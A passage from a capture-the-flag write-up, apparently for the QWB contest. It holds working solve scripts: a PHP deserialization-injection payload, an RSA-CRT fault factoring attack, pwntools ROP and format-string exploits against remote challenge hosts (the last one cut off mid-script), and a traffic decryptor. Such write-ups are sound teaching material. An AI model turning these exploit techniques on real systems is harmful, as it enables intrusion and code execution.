</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>password</span> <span class=o>=</span>  <span class=s2>&#34;aaa</span><span class=se>\&#34;</span><span class=s2>;s:8:</span><span class=se>\&#34;\0</span><span class=s2>*</span><span class=se>\0</span><span class=s2>admin</span><span class=se>\&#34;</span><span class=s2>;&#34;</span> <span class=o>.</span> <span class=o>$</span><span class=nb>exp</span> <span class=o>.</span> <span class=s2>&#34;s:7:</span><span class=se>\&#34;\0</span><span class=s2>*</span><span class=se>\0</span><span class=s2>user</span><span class=se>\&#34;</span><span class=s2>;s:2:</span><span class=se>\&#34;</span><span class=s2>12</span><span class=se>\&#34;</span><span class=s2>;}&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>password</span> <span class=o>=</span> <span class=n>str_replace</span><span class=p>(</span><span class=s1>&#39;}}&#39;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>s:2:</span><span class=se>\&#34;</span><span class=s2>zz</span><span class=se>\&#34;</span><span class=s2>;s:2:</span><span class=se>\&#34;</span><span class=s2>12</span><span class=se>\&#34;</span><span class=s2>;}}&#34;</span><span class=p>,</span> <span class=o>$</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=n>urlencode</span><span class=p>(</span><span class=o>$</span><span class=n>username</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=n>base64_encode</span><span class=p>(</span><span class=o>$</span><span class=n>password</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;curl -vv http://eci-2zei1qumnps7yxtlfg2a.cloudeci1.ichunqiu.com/?username=&#34;</span> <span class=o>.</span> <span class=n>urlencode</span><span class=p>(</span><span class=o>$</span><span class=n>username</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;&amp;password=&#34;</span> <span class=o>.</span> <span class=n>urlencode</span><span class=p>(</span><span class=o>$</span><span class=n>password</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;curl -vv http://eci-2zei1qumnps7yxtlfg2a.cloudeci1.ichunqiu.com/?username=&#34;</span> <span class=o>.</span> <span class=n>urlencode</span><span class=p>(</span><span class=o>$</span><span class=n>username</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;&amp;password=&#34;</span> <span class=o>.</span> <span class=n>urlencode</span><span class=p>(</span><span class=o>$</span><span class=n>password</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>player</span> <span class=o>=</span> <span class=n>new</span> <span class=n>player</span><span class=p>(</span><span class=o>$</span><span class=n>username</span><span class=p>,</span> <span class=o>$</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>dump</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>serialize</span><span class=p>(</span><span class=o>$</span><span class=n>player</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>dump</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=o>$</span><span class=n>dump</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=n>base64_encode</span><span class=p>(</span><span class=o>$</span><span class=n>dump</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=n>unserialize</span><span class=p>(</span><span class=o>$</span><span class=n>dump</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=o>$</span><span class=n>dump</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=侧防>侧防</h3><p>rev
xor key后有个换位操作，做对应逆运算即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>  a = &#39;QWBlogs&#39;
</span></span><span class=line><span class=cl>b = [0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,
</span></span><span class=line><span class=cl>  0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,
</span></span><span class=line><span class=cl>  0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,
</span></span><span class=line><span class=cl>  0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]
</span></span><span class=line><span class=cl>d = [0]*len(b)
</span></span><span class=line><span class=cl>c = &#39;&#39;
</span></span><span class=line><span class=cl>for i in range(0,len(b),4):
</span></span><span class=line><span class=cl>    d[i] = b[i+1]
</span></span><span class=line><span class=cl>    d[i+1] = b[i+2]
</span></span><span class=line><span class=cl>    d[i + 2] = b[i + 3]
</span></span><span class=line><span class=cl>    d[i + 3] = b[i]
</span></span><span class=line><span class=cl>print d
</span></span><span class=line><span class=cl>for i in range(len(b)):
</span></span><span class=line><span class=cl>    c += chr((d[i]-65)^ord(a[i%7]))
</span></span><span class=line><span class=cl>print c
</span></span><span class=line><span class=cl>print len(b)
</span></span><span class=line><span class=cl>print len(c)
</span></span></code></pre></td></tr></table></div></div><h3 id=baby_crt>baby_crt</h3><p>crypto</p><p>RSA CRT fault</p><p><a href=http://dl.ifip.org/db/conf/wistp/wistp2007/KimQ07.pdf>http://dl.ifip.org/db/conf/wistp/wistp2007/KimQ07.pdf</a></p><p><img src=https://hackmd.summershrimp.com/uploads/upload_7487dc2dc6748d87889114d2ddd279d6.png alt></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=mi>26275493320706026144196966398886196833815170413807705805287763413013100962831703774640332765503838087434904835657988276064660304427802961609185997964665440867416900711128517859267504657627160598700248689738045243142111489179673375819308779535247214660694211698799461044354352200950309392321861021920968200334344131893259850468214901266208090469265809729514249143938043521579678234754670097056281556861805568096657415974805578299196440362791907408888958917063668867208257370099324084840742435785960681801625180611324948953657666742195051492610613830629731633827861546693629268844700581558851830936504144170791124745540</span>
</span></span><span class=line><span class=cl><span class=n>sigature</span> <span class=o>=</span> <span class=mi>20152941369122888414130075002845764046912727471716839854671280255845798928738103824595339885345405419943354215456598381228519131902698373225795339649300359363119754605698321052334731477127433796964107633109608706030111197156701607379086766944096066649323367976786383015106681896479446835419143225832320978530554399851074180762308322092339721839566642144908864530466017614731679525392259796511789624080228587080621454084957169193343724515867468178242402356741884890739873250658960438450287159439457730127074563991513030091456771906853781028159857466498315359846665211412644316716082898396009119848634426989676119219246</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c1</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=o>**</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>g</span> <span class=o>=</span> <span class=n>GCD</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>m</span><span class=p>,</span> <span class=n>c1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>-</span> <span class=nb>pow</span><span class=p>(</span><span class=n>sigature</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>n</span><span class=p>),</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>g</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>g</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>c1</span><span class=p>,</span> <span class=n>g</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=n>n</span> <span class=o>//</span> <span class=n>p</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;flag{&#34;</span> <span class=o>+</span> <span class=n>sha1</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>min</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>q</span><span class=p>)))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span> <span class=o>+</span> <span class=s2>&#34;}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 27152 175947855464630318882274211369050447335314682338022384131546160543733195355501291230119719123032944939427500196558321955068490980548179604648557892933129317527213012520680627573834567002223872890806611275061140244033706361520509332755932759567357620312030849014630507761409535339555754829420991613721802012281</span>
</span></span><span class=line><span class=cl><span class=c1># flag{601cb6f6d990ed5b89cf0de60508a95c07543793}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=babymessage>babymessage</h3><p>可以覆盖ebp，因为没开pie，所以直接栈迁移到bss上导致了第二次调用时候会栈溢出。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import *
</span></span><span class=line><span class=cl>#r=process(&#39;./babymessage&#39;)
</span></span><span class=line><span class=cl>r=remote(&#39;123.56.170.202&#39;,21342)
</span></span><span class=line><span class=cl>main_addr=0x00000000040091A
</span></span><span class=line><span class=cl>def leave_name(name):
</span></span><span class=line><span class=cl>    r.sendlineafter(&#39;choice&#39;,&#39;1&#39;)
</span></span><span class=line><span class=cl>    r.sendafter(&#39;name&#39;,name)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def lmessage(content):
</span></span><span class=line><span class=cl>    r.sendlineafter(&#39;choice&#39;,&#39;2&#39;)
</span></span><span class=line><span class=cl>    r.sendafter(&#39;message&#39;,content)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def show():
</span></span><span class=line><span class=cl>    r.sendlineafter(&#39;choice&#39;,&#39;3&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def gd(cmd=&#39;&#39;):
</span></span><span class=line><span class=cl>    gdb.attach(r,cmd)
</span></span><span class=line><span class=cl>    pause()
</span></span><span class=line><span class=cl>pd=0x0000000000400ac3
</span></span><span class=line><span class=cl>psr=0x0000000000400ac1
</span></span><span class=line><span class=cl>backdoor=0x000000000040080A
</span></span><span class=line><span class=cl>elf=ELF(&#39;./babymessage&#39;)
</span></span><span class=line><span class=cl>libc=ELF(&#39;./libc-2.27.so&#39;)
</span></span><span class=line><span class=cl>leave_name(&#39;$0&#39;)
</span></span><span class=line><span class=cl>lmessage(&#39;b&#39;*8+p64(0x6010d0+4))
</span></span><span class=line><span class=cl>lmessage(&#39;b&#39;*8+p64(0x6010d0+4)+p64(pd)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(pd)+p64(0x100)+p64(backdoor))
</span></span><span class=line><span class=cl>r.recvuntil(&#39;\n&#39;)
</span></span><span class=line><span class=cl>r.recvuntil(&#39;\n&#39;)
</span></span><span class=line><span class=cl>r.recvuntil(&#39;\n&#39;)
</span></span><span class=line><span class=cl>leak=u64(r.recv(6).ljust(8,&#39;\x00&#39;))
</span></span><span class=line><span class=cl>print &#39;leak &#39;+hex(leak)
</span></span><span class=line><span class=cl>lbase=leak-libc.symbols[&#39;puts&#39;]
</span></span><span class=line><span class=cl>print &#39;lbase &#39;+hex(lbase)
</span></span><span class=line><span class=cl>sys=lbase+libc.symbols[&#39;system&#39;]
</span></span><span class=line><span class=cl>one=0x10a45c+lbase
</span></span><span class=line><span class=cl>#gd(&#39;b *0x0000000000400886&#39;)
</span></span><span class=line><span class=cl>r.send(&#39;b&#39;*8+p64(0x6010d0+4)+p64(one))
</span></span><span class=line><span class=cl>#r.send(&#39;b&#39;*8+p64(0x6010d0+4)+p64(pd)+p64(0x00000000006010D0)+p64(sys))
</span></span><span class=line><span class=cl>r.interactive()
</span></span></code></pre></td></tr></table></div></div><h3 id=bank>bank</h3><p>no negative check for amount</p><p>transact
Alice -1000
get flag</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_28920235447ac58455a8fc5ce744baac.png alt></p><h3 id=红方辅助>红方辅助</h3><p>分析一下流量的格式，解解密就行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>multiprocessing</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span><span class=p>,</span> <span class=n>sha256</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>GetSalt</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>((</span><span class=n>md5</span><span class=p>(</span><span class=n>sha256</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span> <span class=o>%</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>funcs</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;0&#34;</span> <span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=p>:</span> <span class=n>x</span> <span class=o>-</span> <span class=n>y</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;1&#34;</span> <span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=p>:</span> <span class=n>x</span> <span class=o>+</span> <span class=n>y</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;2&#34;</span> <span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=p>:</span> <span class=n>x</span> <span class=o>^</span> <span class=n>y</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>inv_func</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;0&#34;</span> <span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=p>:</span> <span class=n>x</span> <span class=o>+</span> <span class=n>y</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;1&#34;</span> <span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=p>:</span> <span class=n>x</span> <span class=o>-</span> <span class=n>y</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;2&#34;</span> <span class=p>:</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=p>:</span> <span class=n>x</span> <span class=o>^</span> <span class=n>y</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;0&#34;</span> <span class=p>:</span> <span class=mh>0xefffff</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;1&#34;</span> <span class=p>:</span> <span class=mh>0xefffff</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;2&#34;</span> <span class=p>:</span> <span class=mh>0xffffff</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;socket.data&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>index</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>-</span><span class=mi>100</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>index</span><span class=p>:</span><span class=n>index</span><span class=o>+</span><span class=mi>19</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>data_length</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>header</span><span class=p>[</span><span class=mi>13</span><span class=p>:</span><span class=mi>17</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;little&#39;</span><span class=p>)</span> <span class=o>-</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(data_length)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>btime</span> <span class=o>=</span> <span class=n>header</span><span class=p>[</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=o>+</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>fn</span>   <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>header</span><span class=p>[</span><span class=mi>17</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s2>&#34;&lt;i&#34;</span><span class=p>,</span> <span class=n>btime</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>boffset</span> <span class=o>=</span> <span class=n>offset</span><span class=p>[</span><span class=n>fn</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>-=</span> <span class=n>boffset</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;i&#34;</span><span class=p>,</span> <span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>salt</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>header</span><span class=p>[</span><span class=mi>18</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>index</span><span class=o>+</span><span class=mi>19</span><span class=p>:</span><span class=n>index</span><span class=o>+</span><span class=mi>19</span><span class=o>+</span><span class=n>data_length</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># print(salt, t, cipher)</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>cipher</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>plain</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(((</span><span class=n>inv_func</span><span class=p>[</span><span class=n>fn</span><span class=p>](</span><span class=n>c</span><span class=p>,</span> <span class=n>salt</span><span class=p>))</span> <span class=o>^</span> <span class=n>t</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>%</span> <span class=mi>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>plain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>9</span> <span class=o>+</span> <span class=mi>10</span> <span class=o>+</span> <span class=n>data_length</span> <span class=o>+</span> <span class=mi>4</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.summershrimp.com/uploads/upload_dd2a1b0987a7931fcf7479b8dbd231a6.png alt></p><p>得到3e752bf509ddb4e9a42f1ef30beff495</p><p>flag提交一直不对，改一下格式即可：QWB{3e752bf509ddb4e9a42f1ef30beff495}</p><h3 id=siri---强网先锋>Siri - 强网先锋</h3><p>一个简单的格式化字符串,leak了stack地址之后就是对上面的地址进行一个返回地址和保存的rbp进行一个修改,通过抬栈 执行 one_gadget</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;123.56.170.202&#39;</span><span class=p>,</span><span class=mi>12124</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.27.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;Hey Siri!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>14</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;Remind me to  &#39;</span> <span class=o>+</span> <span class=s1>&#39;BBBBAAAAAAAAStack:%46$pLIBC:%83$pPROC:%47$pCanary:%45$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Stack:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=ne>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mi>288</span>
